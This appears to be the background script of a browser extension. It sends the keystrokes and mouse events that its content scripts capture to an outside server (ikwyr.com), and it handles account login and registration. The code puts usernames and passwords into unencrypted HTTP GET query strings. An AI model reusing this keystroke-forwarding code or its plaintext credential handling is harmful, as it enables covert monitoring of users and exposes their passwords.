
chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    console.log(sender.tab ?
                "from a content script:" + sender.tab.url :
                "from the extension?");
    if (request.type == "keystroke"){
 //     sendserver(JSON.stringify(request.data));
        sendhttp("sendks.asp?q=",JSON.stringify(request.data),function(){
        console.log(xmlhttp.responseText)
      })
        //console.log(JSON.stringify(request.data))
    }

    if(request.type=="mouse"){
        sendhttp("sendms.asp?q=",JSON.stringify(request.data),function(){
            console.log(xmlhttp.responseText)
        })
    }

    if(request.type=="unamepwd"){
    	console.log("usname recieved"+request.data1+request.data2)
    	if(request.data1=="" || request.data2==""){
    		console.log("empty input");
    		sendResponse({data:"empty input"})
            return;
    	}
        sendhttp("bglogin.asp?u=",request.data1+"&p="+request.data2,function(){
            if(xmlhttp.readyState==4 && xmlhttp.status==200){
                console.log(xmlhttp.responseText)
                sendResponse({data: xmlhttp.responseText})
            }
        });
    }

    if(request.type=="logout"){
        console.log("logout request recieved")
        sendhttp("logout.asp?q=","ojbk",function(){
            if(xmlhttp.readyState==4 && xmlhttp.status==200){
                console.log(xmlhttp.responseText)
                sendResponse({data: xmlhttp.responseText})
            }
        });
    }

    if(request.type=="checkstatus"){
        console.log("checkstatus recieved")
        sendhttp("showcookie.asp?q=","ojbk",function(){
            if(xmlhttp.readyState==4 && xmlhttp.status==200){
                console.log(xmlhttp.responseText)
                sendResponse({data: xmlhttp.responseText})
            }
        });
    }

    if(request.type=="register"){
        console.log("register recieved")
        sendhttp("exreg.asp?u=",request.u+"&p="+request.p+"&f="+request.f+"&l="+request.l,function(){
            if(xmlhttp.readyState==4 && xmlhttp.status==200){
                console.log(xmlhttp.responseText)
                sendResponse({data: xmlhttp.responseText})
            }
        });
    }

    if(request.type=="logintest"){
        console.log("logintest")
        sendhttp("logintest.asp?q=","hello",function(){
            if(xmlhttp.readyState==4 && xmlhttp.status==200){
                console.log(xmlhttp.responseText)
                sendResponse({data: xmlhttp.responseText})
            }
        });

    }

    return true;

  });

function sendserver(str){
	if(str==""){
		console.log("empty input");
		return;
	}
	if (window.XMLHttpRequest){
		xmlhttp = new XMLHttpRequest();
	}else{
		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP")
	}
	xmlhttp.onreadystatechange=function(){
		console.log(xmlhttp.responseText)
	}
	xmlhttp.open("get","http://www.ikwyr.com/sendks.asp?q="+str,true);
	xmlhttp.send();
}

function sendhttp(url,str,func){
    if(window.XMLHttpRequest){
        xmlhttp=new XMLHttpRequest()
    }else{
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP")
    }
    xmlhttp.onreadystatechange=func;
    xmlhttp.open("get","http://www.ikwyr.com/"+url+str,true)
    xmlhttp.send()
}
